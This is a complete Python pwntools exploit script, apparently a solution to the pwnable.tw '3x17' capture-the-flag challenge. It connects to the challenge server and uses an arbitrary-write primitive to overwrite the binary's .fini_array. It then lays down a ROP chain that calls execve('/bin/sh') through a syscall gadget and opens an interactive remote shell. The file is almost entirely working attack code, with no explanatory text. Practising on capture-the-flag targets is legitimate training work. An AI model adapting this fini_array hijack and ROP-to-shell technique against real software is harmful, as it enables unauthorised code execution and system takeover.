from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)

elf = context.binary = ELF('3x17')


def write_to(addr, data):
    sla(b'addr:', str(addr).encode())
    sa(b'data:', data)

#nc chall.pwnable.tw 10105

p = remote('chall.pwnable.tw', 10105)

#p = process()
#gdb.attach(p, gdbscript='''
#b *0x401bed
#           b *0x402960
#           b *0x0000000000406c30
#           c''')

POP_RDI = 0x0000000000401696 #: pop rdi ; ret
POP_RDX = 0x0000000000446e35 #: pop rdx ; ret
POP_RSI = 0x0000000000406c30 #: pop rsi ; ret
POP_RAX = 0x000000000041e4af #: pop rax ; ret
MOV_PRSI_RAX = 0x000000000047c1b1 #: mov qword ptr [rsi], rax ; ret
LEAVE = 0x0000000000401c4b #: leave ; ret

SYSCALL = 0x446e2c
binsh = 0x68732f6e69622f
binsh_addr = 0x4b4000



finiarray = 0x4b40f0
caller = 0x402960
main = 0x401b6d
write_to(finiarray, p64(caller) + p64(main))
write_to(finiarray + 0x10, p64(POP_RSI) + p64(binsh_addr))
write_to(finiarray + 0x10*2, p64(POP_RAX) + p64(binsh))
write_to(finiarray + 0x10*3, p64(MOV_PRSI_RAX) + p64(POP_RDI + 1))
write_to(finiarray + 0x10*4, p64(POP_RDI) + p64(binsh_addr))
write_to(finiarray + 0x10*5, p64(POP_RAX) + p64(0x3b))
write_to(finiarray + 0x10*6, p64(POP_RDX) + p64(0))
write_to(finiarray + 0x10*7, p64(POP_RSI) + p64(0))
write_to(finiarray + 0x10*8, p64(SYSCALL) + p64(0))
write_to(finiarray, p64(LEAVE) + p64(LEAVE + 1))
print('done')



p.interactive()